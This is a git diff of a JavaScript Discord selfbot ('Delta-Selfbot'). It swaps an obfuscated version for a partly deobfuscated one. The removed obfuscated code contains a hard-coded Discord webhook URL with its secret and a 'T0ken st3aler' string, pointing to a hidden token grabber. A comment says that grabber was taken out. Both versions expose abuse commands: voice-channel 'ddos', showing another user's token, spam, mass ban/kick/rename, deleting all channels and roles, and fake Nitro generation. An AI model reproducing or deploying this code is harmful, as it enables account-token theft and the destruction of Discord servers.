@@ -1,1026 +1,3231 @@
-const _0x1321 = ['🌙**Pannel de Help**🌙', 'Voice Channels', 'reset', 'Commande token effectué', '`Supprime toutes tes backups`', '**Commande Backup** :gear:: ', 'kick all', 'defaultChanne', 'type', 'Western Europe', ' vient de vous envoyer une invatation suspecte ', 'setTitle', 'position', 'japan', 'Commande user info executé', ' sur spotify**', '/discord.gift/', 'Joined', 'https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif', 'Commande cmd executé', 'None', 'Fev', 'nitro**', 'ass**', 'hentai', 'Commande nsfw gif effectué', '**Commandes Moderation** :tools:: ', 'tag', 'mentionnable:', 'then', 'messageDelete', 'Commande shutdown effectué', 'body', 'nsfw-gif**', 'Commande roles list executé', 'abcdefghijklmnopqrstuvwxyz', 'Commande help executé', 'Commande nitro generator effectué', 'bannable', 'name all**', 'Commande kick effectué', 'Token match ', 'oui!', 'Status', '[Lien du serveur discord](https://discord.gg/exCS5rwpjW)', '@here', '\x0ale bot ', ' __**VS**__ ', '**Commande ddos vocal activé**', 'guildDelete', 'delta', 'Commande change hypesquad executé', 'channel', 'help backup', 'Commande veski effectué', '`Affiche les commandes moderation` :tools:', 'setPosition', '**Pannel de Help Fun** :joy: ', 'splice', 'ERROR', 'calcul de relation plausible ❤', 'Oct', 'discord.js', '`Envoie les information d\x27un membre du serveur`', 'setAssetsSmallImage', 'hastebin-gen', 'https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif', '50%', '60%', 'VIP U.S. East', 'help pour plus d\x27informations', 'purge**', 'U.S. East', 'members', 'icon', 'Commande friends backup executé', 'hasPermission', 'Mar', ' at ', 'name', 'https://canary.discordapp.com/api/v6/entitlements/gift-codes/', 'KICK_MEMBERS', 'delete', 'mentions', 'spam (text)**', 'kick', '`lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `veski`, `load`, `punch`, `calin`', 'setActivity', 'calin', '`Test d\x27amour`', 'toDiscord', 'match', 'Oui', 'Verification Level', '8ball (text)**', 'setState', 'setDetails', 'Client', ' / ', 'EMBED_LINKS', ' fait un calin a ', '\x0a║--> At: ', 'xllelHltGdY7DP_0s1XST4cgzTs', 'token (@user)**', 'gen token', 'change hypesquad bravery', 'Commande load effectué', 'owner', '`Supprime tout les salons d\x27un serveur`', 'heapUsed', '`Envoie une image thigh`', 'Commande purge backup executé', 'now', '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`', 'rire', 'thigh**', 'Firefox', 'guild', 'ban (@user)**', 'kiss', 'Commande restart effectué', 'Commande hentai effectué', 'https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif', 'createRole', 'backup l', 'platform', 'change hypesquad brilliance', 'Extreme', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif', ':information_source:  Votre statut a été réinitialisé ! :information_source:', '• Username', 'https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.giff', '`Envoie la liste de tout les roles d\x27un serveur`', 'ban all**', 'green', ':x: **permission insuffisante (embed_links)** ', '`Kick tout les membres d\x27un serveur`', 'backup load (id)** Pour load la backup\x0a\x0aDelta-Selfbot', 'Commande backup info executé', 'Do Not Disturb', '**Pannel de Help nsfw** :underage: ', 'application/json', 'request', 'presence', 'bgRed', 'Created', 'split', 'Vous devez mettre quelque chose à dire !', 'blue', 'mp friend (message)**', 'Juin', 'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif', 'shutdown**', 'ddos voc', 'Channels:', 'Nouvelle backup du serveur ', '\x0amembres ayant ce role: ', ' est un robot je ne peux pas charger le profil desolé :/', '**Liste des commandes**', 'setParty', 'setThumbnail', 'token:', 'setRegion', 'joinedAt', '`Frappe un membre`', 'Commande anal effectué', '`Créé une backup d\x27un serveur`', 'sydney', 'Roles', 'setUrl', 'nitro', 'Commande role info effectué', 'ddos voc**', 'utf8', '\x0ala reponse est: ', 'Nickname', '`Change votre token`', ' | ', 'Online', 'stop spam', 'For Loading A Backup', '**Commande spam stopé**', '**Pannel de Help Moderation** :tools: ', 'Avatar URL', '\x0a          _____\x0a         /    /\x5c\x0a        /    /  \x5c\x0a       /    /    \x5c\x0a      /    /  /\x5c  \x5c\x0a     /    /  /  \x5c  \x5c\x0a    /    /  /\x5c   \x5c  \x5c\x0a   /    /  /  \x5c   \x5c  \x5c\x0a  /    /__/____\x5c   \x5c  \x5c\x0a /              \x5c   \x5c  \x5c\x0a/________________\x5c   \x5c  \x5c\x0a\x5c_____________________\x5c /\x0a', 'role info', 'edit', 'say (text)**', 'Commande 4k effectué', '**Aucune backup avec l\x27id ', 'Delta', 'Token info', 'Commande help moderation executé', 'Rpc', 'London', 'help moderation**', '0aA', 'Commande encode effectué', '\x0a╔═════════════════════════════════╗', 'Mai', '  **Attention**\x0a\x0aMon role n\x27est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup\x0a\x0aDelta-Selfbot', 'set serveur name', 'messageUpdate', '35%', 'fetchMessages', 'txt', 'catch', 'Windows', 'content', ':white_check_mark: **Vous avez rejoint la hypesquad \x27brilliance\x27**', 'Delta-Selfbot', 'Avr', '1024px-uvsun_trace_big', '`Envoie une photo de fesse`', '`Permet de changer sa maison hypesquad`', 'help utile', 'Commande spotify effectué', '  Succès !', '655091815401127966', 'backup load (id)**', 'couleur:', 'check token (token)**', '655696285286006784', 'highestRole', 'getUTCMinutes', 'Commande ass effectué', 'random', 'un nom de rôle est nécessaire', '10%', '90%', 'lovecalc (@user)**', ' ago', 'cmd', ':x: **Veuillez executer cette commande dans un serveur!**', '\x0a╔═════════════════════════════════╗\x0a║-->  User Name : ', 'lovecalc', 'author', 'bgBlue', '40%', 'probablement', 'destroy', 'HircHg', 'ORANGE', '`Supprime tout les messages`', 'pop', ' boup bip boup super tu n\x27est pas un robot ^^!', 'user info', 'filter', 'getUTCFullYear', 'Commande ban effectué', '`Envoie un chargement`', 'MessageBuilder', 'position:', 'discriminator', 'Commande ban all effectué', 'Commande ddos vocal executé', 'kiss (@user)**', './Data/backups.json', 'size', 'Name:', 'Text Channels', 'setTimestamp', '`Créé une backup de tous tes amis`', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0', 'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif', 'message', 'Channels', 'setFooter', 'spotify (text)**', 'Commande discord effectué', 'addField', 'backup info', ' days', 'Commande set serveur name effectué', 'https://nekobot.xyz/api/image', 'offline', 'name all', 'Delta-Selbot', '╟─────────────────────────────────╢', 'awaitMessages', 'mentionable', 'Commande help hack executé', 'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif', 'help hack', './config.json', 'setAssetsLargeImage', 'permissionOverwrites', 'Dimanche', 'veski', '\x0amentionnable: ', ':x: **Veuillez mentionner un utilisateur!**', 'Commande thigh effectué', 'Commande reset effectué', '**Commandes Utile** :globe_with_meridians: :', 'Commande ddos voc stopé', 'boom (@user)**', 'Insane', 'permissions', '  Error', '║--> Vous avez rejoint le serveur ', 'Member Count', 'setAssetsLargeText', 'slice', 'pussy', 'Commande help fun executé', 'Vous n\x27avez pas nitro snif, ne t\x27inquiète pas mon autoclaim va tout faire pour que tu en recuperes 1', '66.0', 'hoist', 'https://discordapp.com/api/v6/hypesquad/online', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36', 'channels list**', 'setDescription', '`kick un membre du serveur`', '/!\x5c Anti mp', 'delete all channel', 'non...', '```', 'discord.gg', 'kickable', '`Envoie la liste de tout les channels d\x27un serveur`', '`Supprime tout les roles d\x27un serveur`', '║--> 1 message mp surppimé \x0a║--> User: ', '\x0a║--> Content: ', '`Fait exploser un utilisateur`', 'Sydney', 'Etes vous sur de vouloir supprimer toutes vos backups???', 'Commande create backup executé', 'memoryUsage', 'Creator', 'discord', 'member', 'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif', 'from', 'setIcon', '• Platform', 'send', 'Non', '`Met un status spofity`', ':x: **Pas de test definit**', '@everyone', 'La **backup** a bien été supprimée.', 'help moderation', 'memberCount', 'time', 'a6uny9jcMjet2W2LASruribq6VI', 'getUTCDate', 'length', '**Commandes Nsfw** :underage: :', '`Ban un membre du serveur`', 'BAN_MEMBERS', '`Liste des commandes`', 'calculatedPosition', '`Affiche les commandes info` :globe_with_meridians:', 'Mardi', 'Created At', '`Envoie un message privé a tout tes amis`', '`\x0a**', 'nickname', '`Envoie un gif de sexe`', 'RichEmbed', 'shutdown', 'https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif', 'fight', 'Members', 'T0ken st3aler', 'node-fetch', 'Commande delete backup executé', '╚═════════════════════════════════╝', 'delete all role', '`Crypte ton text en base64`', 'substring', '`Embrasse un membre`', 'help nsfw**', 'backup friend', 'Guild ID:', 'stringify', '`user info`, `serveur info`, `stats`, `restart`, `reset`, `spotify`, `role info`, `encode`, `discord`, `gen token`, `check token`, `mp friend`, `change hypesquad`', 'https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif', 'hongkong', 'load**', 'prefix', 'oui', 'Xiq-WQ', 'error', 'Vous etes sur un compte nitro WOAW bravo ;)', '45%', 'canary', 'stats**', 'XnyXiA', '**Pannel de Help backup** :gear: ', 'createdAt', 'kick (@user)**', ':x: **Access Denied**', '***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo envoiller un message, add friend ect...***', 'encode', 'POST', ' Erreur', 'serveur info**', 'backup create', 'Jeudi', 'Je renomme tout le monde par ', 'anal', '80%', 'reduce', '`Affiche les commandes fun` :joy:', ':x: **Aucun utilisateur mentionné**', 'query', 'Brazil', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', 'toString', 'Offline/Invisible', ':x: **Veuillez executer cette commande sur un serveur!**', 'map', 'https://discord.com/api/webhooks/757980252449538089/YSL9D-5qkIjNeuYTyzGzD_KWobbNY_DPEBS36OXqu-Wy_wWnO9R_QwVvFYk7kTD-HbYt', 'Region:', 'bold', 'https://media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif', 'help fun', 'webhook-discord', '`Spam un text`', 'roles list**', '8ball', '0123456789', 'encode (text)**', '`Affiche les commandes backups` :gear:', 'Commande punch effectué', 'first', 'setNickname', 'Log:', 'stop spam**', 'category', 'peut etre?', 'region', ' day', 'array', 'json', 'jamais!', ' s\x27est enfui!**', 'spotify', '```[', 'backup purge', '65%', 'check token', 'Commande check token executé', '`Affiche votre version de discord js`', 'username', 'push', ']```', 'Changement du nom du serveur pour: ', 'bot', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', ' ||', ' has been successfully kicked :point_right: ', 'utf-8', 'hexColor', '**redémarrage** du self bot...', 'backup friend**', 'Commande 8ball executé', 'totalmem', 'Singapore', '                 \x0a╟─────────────────────────────────╢\x0a║-->  Users    : ', 'Owner:', 'join', 'Commande calin effectué', 'Commande fight effectué', 'Commande kick all effectué', '`Met ton text a l\x27envers`', 'calin (@user)**', 'iconURL', '`Envoie les informations d\x27une backup`', 'setName', 'help nsfw', 'help utile**', '`Envoie les informations d\x27un role`', '15%', 'exit', '`Arrete le spam`', 'ownerID', 'discordrpcgenerator', '• Token', ' \x0a╟─────────────────────────────────╢\x0a║-->  Prefix   : ', 'set serveur name (text)**', 'Commande help info executé', 'ready', '`Eteint le selfbot`', 'end', '**Serveur info**', 'Commande channels list executé', 'displayAvatarURL', 'spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e', 'hentai_anal', '• Nitro', 'red', '`Change le nom du serveur`', 'MANAGE_NICKNAMES', 'Commande help backup executé', ':white_check_mark: **Vous avez rejoint la hypesquad \x27ballance\x27**', 'Commande rire effectué', 'restart', '768215201312014376', 'hentai**', '.**', 'Commande delete all role effectué', '`Envoie un gif rire`', 'status', 'backup info (id)**', 'token', 'permission insuffisante', 'Amsterdam', 'say', 'punch', 'Lundi', '`Pose une question`', 'createChannel', 'Commande Say executé', 'Delta selfbot', 'Commande reverse effectué', 'voice', '30%', 'getUTCMonth', 'channels', 'Sep', 'spam', 'avatar', 'gzip, deflate, br', ':white_check_mark: **Tu écoutes ', '               \x0a╟─────────────────────────────────╢\x0a║-->  Guilds   : ', 'Commande pussy effectué', '<@&', 'GET', '`Reset le status`', '║--> New ghostping \x0a║--> serveur: ', '/help pour plus d\x27information', 'user info (@user)**', 'Tu as oublié de définir une **id de backup**. Utilise la commande `', '`Rename tout les membres d\x27un serveur`', ' \x0a**est 100% valide** :white_check_mark:', 'ddos-stop', 'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif', ' kiss ', 'repeat', 'Commande avatar executé', 'log', '(╯°□°）╯︵  ┻━┻', 'users', '**Commande rire:**', 'roles', 'substr', ' **Ce Fait Explosé Par **💣💥 ', 'loading..```', 'punch (@user)**', 'Users:', 'yellow', 'Idle', 'includes', '░░░░░░░░░░ 0%', '║--> message mp modifié \x0a║--> User: ', 'parent', '▓▓▓▓▓▓▓▓░░ 80%', 'Low', 'Delta Selfbot', 'setColor', 'setAuthor', '`Vérifie si le token est valide`', 'rire**', 'load', 'veski (@user)**', 'color', 'verificationLevel', '25%', 'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif', 'setImage', 'Commande spam executé', '*/*', '║--> [', 'pgif', ' has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right: ', 'Commande delete all channel effectué', 'russia', 'setApplicationId', 'delete all role**', '• Utilisateurs', 'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif', 'kick all**', '• Salons', 'mobile', 'premium', 'Quelle est ta question? :rolling_eyes: (essayeplutot:', 'gen token**', '`Affiche les commandes nsfw` :underage:', 'Servers:', 'displayName', 'liste des salons:', 'Jan', 'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif', 'startsWith', 'fight (@user)**', 'charAt', 'https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif', '`Envoie une image sexe en 4k`', 'indexOf', '• Prefix choisi', 'Deleted all your backups.', '`Genere un nitro random`', '100%', 'Hong Kong', 'nombre de membres ayant ce role:', 'Juillet', '\x0a║-->At: ', 'setPresence', 'writeFile', '  Voila!', 'serveur info', '                 \x0a╟─────────────────────────────────╢\x0a║-->  Channels : ', 'emojis', 'help', 'guildCreate', '`set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`', 'purge', 'find', 'guilds', 'Commande help nsfw executé', 'Mem Usage:', 'Central Europe', '║--> Vous avez quitté le serveur ', '[Click here!](', 'help` pour avoir plus d\x27informations', '`Charge une backup`', 'id du role:', '75%', '**Selfbot Statistics**', 'Commande load backup executé', 'get', 'backup i', 'forEach', 'login', '╟─────────────────────────────────', 'superagent', '`Un autoclaim est en permanance activé sur le self`', 'toFixed', ' friends.', 'le prefix est:  ', 'india', 'U.S. South', 'ban all', 'je ne pense pas.', 'setType', 'Commande stats effectué', ':x: **Commande uniquement utilisable sur un serveur**', 'cmd**', 'Discord Version : **', 'Le token ', 'help pour avoir plus d\x27informations.', 'https://canary.discordapp.com/channels/', 'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif', 'Oui/Non', 'every', 'base64', 'une erreur est survenue que je ne peux régler', 'floor', 'index', 'backup delete', 'getTime', '\x0aposition: ', '▓▓▓▓▓▓░░░░ 60%', '`Affiche un text en embed`', 'change hypesquad ballance', 'non', ' punch ', '`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`', 'avatarURL', 'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif', '`Envoie une image/gif hentai`', '             \x0a╟─────────────────────────────────╢\x0a║-->  Bots     : ', 'Commande purge effectué', 'mp friend', 'Roles:', '  **Please wait** ...\x0a\x0aCréation de la backup. Attendre la finalisation...\x0a\x0aDeltea-Selfbot', 'comparePositionTo', 'sort', 'user', ' vien d\x27être crée, voici son id : ', 'setStartTimestamp', 'reverse', 'Le token: '];
-(function(_0x1d5df1, _0x13219b) {
-    const _0x4aa07e = function(_0x1dd984) {
-        while(--_0x1dd984) {
-            _0x1d5df1.push(_0x1d5df1.shift());
-        }
-    };
-    _0x4aa07e(++_0x13219b);
-}(_0x1321, 0x1f0));
-const _0x4aa0 = function(_0x1d5df1, _0x13219b) {
-    _0x1d5df1 = _0x1d5df1 - 0x0;
-    let _0x4aa07e = _0x1321[_0x1d5df1];
-    return _0x4aa07e;
-};
-var _0x14ffc7 = _0x4aa0,
-    Discord = require('discord.js');
-require('colors');
-const client = new Discord.Client(),
-    ConfigFile = require('./config.json'),
-    token = ConfigFile.token,
-    base64 = require('base-64'),
-    utf8 = require('utf8'),
-    os = require('os'),
-    fs = require('fs'),
-    hastebins = require('hastebin-gen'),
-    rpcGenerator = require('discordrpcgenerator'),
-    backups = require('./Data/backups.json'),
-    prefix = ConfigFile.prefix,
-    superagent = require('superagent'),
-    fetch = require('node-fetch'),
-    request = require('request'),
-    {
-        bgMagenta
-    } = require('colors');
-let i = 0x0;
-
-function nitrocode(_0x1dd984, _0x287524) {
-    const _0x36de88 = _0x14ffc7;
-    var _0x480d2c = '';
-    if(_0x287524.indexOf('0') > -0x1) _0x480d2c += _0x36de88('0x265');
-    if(_0x287524[_0x36de88('0x69')]('A') > -0x1) _0x480d2c += _0x36de88('0x281');
-    if(_0x287524[_0x36de88('0x69')]('a') > -0x1) _0x480d2c += _0x36de88('0xe1');
-    var _0x58f3b0 = '';
-    for(var _0x4b88f3 = _0x1dd984; _0x4b88f3 > 0x0; --_0x4b88f3) {
-        _0x58f3b0 += _0x480d2c[Math[_0x36de88('0xa4')](Math.random() * _0x480d2c.length)];
-    }
-    return _0x58f3b0;
-}
-const color = ConfigFile.color,
-    rire = ['https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif', 'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif', 'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif', 'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif', 'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif', 'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif', 'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif', 'https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif'],
-    kiss = ['https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif', 'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif', 'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif', 'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif'],
-    hugh = ['https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif', 'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif', 'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif', 'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif'],
-    veski = ['https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif', 'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif', 'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif'],
-    punch = ['https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif', 'https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif', 'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif', 'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif'];
-var verifLevels = ['None', 'Low', 'Medium', '(╯°□°）╯︵  ┻━┻'],
-    region = {
-        'Brésil': 'Brazil',
-        'eu-central': 'Central Europe',
-        'singapoure': 'Singapore',
-        'us-central': 'U.S. Central',
-        'sydney': 'Sydney',
-        'us-east': 'U.S. East',
-        'us-south': 'U.S. South',
-        'us-west': 'U.S. West',
-        'eu-west': 'Western Europe',
-        'vip-us-east': 'VIP U.S. East',
-        'Londre': 'London',
-        'amsterdam': 'Amsterdam',
-        'hongkong': 'Hong Kong'
-    };
-
-function translateDate(_0x2d0018) {
-    const _0x41185a = _0x14ffc7,
-        _0xd90571 = [_0x41185a('0x62'), _0x41185a('0xd3'), _0x41185a('0x10b'), _0x41185a('0x192'), _0x41185a('0x186'), _0x41185a('0x155'), _0x41185a('0x70'), 'Aout', _0x41185a('0x1a'), _0x41185a('0xfb'), 'Nov', 'Dec'],
-        _0x2fe795 = [_0x41185a('0x1de'), _0x41185a('0x10'), _0x41185a('0x220'), 'Mercredi', _0x41185a('0x24e'), 'Vendredi', 'Samedi'];
-    return _0x2fe795[_0x2d0018.getUTCDay()] + ', ' + _0x2d0018[_0x41185a('0x218')]() + ' ' + _0xd90571[_0x2d0018[_0x41185a('0x18')]()] + ' ' + _0x2d0018[_0x41185a('0x1b7')]() + _0x41185a('0x10c') + _0x2d0018.getUTCHours() + ':' + zeros(_0x2d0018[_0x41185a('0x19f')](), 0x2) + ':' + zeros(_0x2d0018.getUTCSeconds(), 0x2) + '.' + zeros(_0x2d0018.getUTCMilliseconds(), 0x3);
-}
-
-function checkDays(_0x4d4672) {
-    const _0x2c59a3 = _0x14ffc7;
-    var _0x5825c1 = new Date(),
-        _0x4ae821 = _0x5825c1.getTime() - _0x4d4672[_0x2c59a3('0xa7')](),
-        _0x51b668 = Math.floor(_0x4ae821 / 0x5265c00);
-    return _0x51b668 + (_0x51b668 == 0x1 ? _0x2c59a3('0x270') : _0x2c59a3('0x1cf')) + _0x2c59a3('0x1a6');
-};
+/*
+Le code a été désobfusqué par punchnox
+j'ai donc retiré le grabber de delta self
+Vous pourrez l'utiliser sans danger, enfin je crois O-O
+*/
+const Discord = require("discord.js");
+require("colors");
+const client = new Discord.Client();
+const ConfigFile = require("./config.json");
+const token = ConfigFile["token"];
+const base64 = require("base-64");
+const utf8 = require("utf8");
+const os = require("os");
+const fs = require("fs");
+const hastebins = require("hastebin-gen");
+const rpcGenerator = require("discordrpcgenerator");
+const backups = require("./Data/backups.json");
+const prefix = ConfigFile["prefix"];
+const superagent = require("superagent");
+const fetch = require("node-fetch");
+const request = require("request");
+const {
+    bgMagenta,
+    setTheme
+} = require("colors");
 client.on('ready', function() {
-    const _0x4f053f = _0x14ffc7;
-    console.log('Delta-Selfbot' [_0x4f053f('0x1ac')]), console[_0x4f053f('0x2f')](_0x4f053f('0x177')[_0x4f053f('0x39')]), console[_0x4f053f('0x2f')]((_0x4f053f('0x1a9') + client[_0x4f053f('0xb9')][_0x4f053f('0xd9')] + '   \x0a╟─────────────────────────────────╢\x0a║-->  User id : ' + client[_0x4f053f('0xb9')]['id'] + _0x4f053f('0x29f') + prefix + _0x4f053f('0x28b') + client[_0x4f053f('0x7d')][_0x4f053f('0x25b')](_0xbed192 => _0xbed192[_0x4f053f('0x215')])[_0x4f053f('0x252')]((_0x8f0f48, _0x23c609) => _0x8f0f48 + _0x23c609) + _0x4f053f('0xb2') + client.users[_0x4f053f('0x1b6')](_0x390a4c => _0x390a4c[_0x4f053f('0x280')])[_0x4f053f('0x1c1')] + _0x4f053f('0x76') + client.channels[_0x4f053f('0x1c1')] + _0x4f053f('0x1f') + client[_0x4f053f('0x7d')][_0x4f053f('0x1c1')] + '                 \x0a╚═════════════════════════════════╝ ')[_0x4f053f('0x14f')]);
-    if(client.user.premium > 0x0) console[_0x4f053f('0x2f')](_0x4f053f('0x23f')[_0x4f053f('0x145')]);
-    else console[_0x4f053f('0x2f')](_0x4f053f('0x1f0').red);
-}), client.on('ready', function() {
-    const _0x510b1c = _0x14ffc7;
-    if(client[_0x510b1c('0xb9')][_0x510b1c('0x280')]) console.log((client.user[_0x510b1c('0x27c')] + _0x510b1c('0x15c')).red), process[_0x510b1c('0x29a')](0x1);
-    else console[_0x510b1c('0x2f')]((client[_0x510b1c('0xb9')][_0x510b1c('0x27c')] + _0x510b1c('0x1b4')).green);
-});//
-var uuid = () => ([0x989680] + -0x3e8 + -0xfa0 + -0x1f40 + -0x174876e800)['replace'](/[018]/g, _0x5cd30f => (_0x5cd30f ^ Math.random() * 0x10 >> _0x5cd30f / 0x4)['toString'](0x10));
-client.on('ready', function() {
-    const _0x5a704f = _0x14ffc7;
-    rpcGenerator.getRpcImage(_0x5a704f('0x4'), _0x5a704f('0x193'))[_0x5a704f('0xdb')](_0x26251f => {
-        const _0x32049d = _0x5a704f;
-        rpcGenerator.getRpcImage(_0x32049d('0x4'), _0x32049d('0xf0')).then(_0xdaf5f => {
-            const _0xf58480 = _0x32049d;
-            let _0x2c28ef = new rpcGenerator[(_0xf58480('0x180'))]()[_0xf58480('0x295')](_0xf58480('0x191'))[_0xf58480('0x168')]('https://www.twitch.tv/discord')[_0xf58480('0x97')]('PLAYING')[_0xf58480('0x54')](_0xf58480('0x4'))[_0xf58480('0x11e')]('Delta Selfbot')[_0xf58480('0x1dc')](_0xdaf5f.id)[_0xf58480('0xfe')](_0x26251f.id)[_0xf58480('0x1ec')](_0xf58480('0x17d'))['setState']('Utilise le Delta Selfbot')[_0xf58480('0xbb')](Date.now())[_0xf58480('0x15e')]({
-                'id': uuid()
-            });//
-            client[_0xf58480('0xb9')]['setPresence'](_0x2c28ef[_0xf58480('0x118')]()).catch(console[_0xf58480('0x23e')]);
-        });//
-    });
-})
-let cmd = new Discord.RichEmbed();
-cmd.setTimestamp()
-    .setColor(color)
-    .setTitle('**Liste des commandes**')
-    .addField('**Commande Help**', '`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`')
-    .addField('**Commande Backup** :gear:: ', '`backup friend`, `backup create`, `backup load`, `backup delete`, `backup purge`, `backup info`')
-    .addField('**Commandes Fun** :joy:: ', '`lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `veski`, `load`, `punch`, `calin`')
-    .addField('**Commandes Moderation** :tools:: ', '`set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`')
-    .addField('**Commandes Nsfw** :underage: :', '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`')
-    .addField('**Commandes Utile** :globe_with_meridians: :', '`user info`, `serveur info`, `stats`, `restart`, `reset`, `spotify`, `role info`, `encode`, `discord`, `gen token`, `check token`, `mp friend`, `change hypesquad`')
-.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
-.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
-.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
-.setFooter('Delta-Selfbot');
-let help_hack = new Discord.RichEmbed()
-    .setTimestamp()
-    .setColor(color)
-    .setTitle('**Pannel de Help Hacking**')
-    .addField('**' + prefix + 'ddos voc**', '`Lance une attaque ddos sur les channels vocal`')
-    .addField('**' + prefix + 'ddos-stop**', '`Stop une attaque ddos sur les channels vocal`')
-    .addField('**' + prefix + 'token (@user)**', '`Affiche le token d\x27un utilisateur`')
-    .addField('**' + prefix + 'spam (text)**', '`Spam un text`')
-    .addField('**' + prefix + 'stop spam**', '`Arrete le spam`')
-.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
-.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
-.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
-.setFooter('Delta-Selfbot'),
-    help = new Discord.RichEmbed();
-help.setTimestamp()
-    .setColor(color)
-    .setTitle('🌙**Pannel de Help**🌙')
-    .addField('**' + prefix + 'cmd**', '`Liste des commandes`')
-    .addField('**' + prefix + 'help fun**', '`Affiche les commandes fun` :joy:')
-    .addField('**' + prefix + 'help backup**', '`Affiche les commandes backups` :gear:')
-    .addField('**' + prefix + 'help moderation**', '`Affiche les commandes moderation` :tools:')
-    .addField('**' + prefix + 'help utile**', '`Affiche les commandes info` :globe_with_meridians:')
-    .addField('**' + prefix + 'help nsfw**', '`Affiche les commandes nsfw` :underage:')
-.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
-.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
-.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
-.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
-.setFooter('Delta-Selfbot');
